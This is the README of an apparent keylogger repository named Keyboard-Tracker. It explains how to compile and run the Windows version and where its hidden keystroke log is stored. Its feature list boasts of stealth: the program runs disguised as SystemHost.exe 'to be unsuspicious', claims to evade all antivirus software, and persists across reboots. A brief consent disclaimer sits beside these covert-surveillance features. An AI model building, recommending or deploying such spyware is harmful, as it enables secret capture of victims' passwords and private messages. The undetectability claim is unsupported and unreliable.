# Keyboard-Tracker
Application to track all user keyboard strokes

If you are a developer, click [here](#For-Developers).

NOTE: These applications cannot be installed on a machine without the consent of the system's owner  
If you do so, you are solely responsible for the action and consequences  

This application is available for Windows and Linux Operating Systems  

### Windows  
> Goto releases and download the zip file and extract it on your computer  
> Download a C++ compiler with Win32 API preferably [MinGW](https://sourceforge.net/projects/mingw/files/MinGW/Base/w32api/)
> Open Command Prompt and move to the path where the folder is extracted. For Example, `cd C:\Downloads\Keyboard-Tracker\windows`  
> Now Type `g++ main.cpp` and hit Enter  
> The Tracker should start running, verify by below step.  
> To see the tracker log, Goto `C:\Users\<UserName>\AppData\Roaming\WinmpeT\log.sys`  
> Open the log.sys file with notepad  
> Note: `AppData` folder may be hidden, make sure to unhide it
> 
> ##### Features
> > This application runs in the background as SystemHost.exe (to be unsuspicious)  
> > This Tracker is undetectable by any anti virus software  
> > The appliaction restarts automatically on Turning On the computer  

### Linux
> Application for Linux OS's is still under development  

`Make sure to visit this repo frequently for updates and fixes`  

### For Developers
If you are not familiar with Win32 API, [this](https://docs.microsoft.com/en-us/windows/win32/learnwin32/learn-to-program-for-windows) is a good place to start.  
Open this project in Visual Studio C++, as a Windows Project
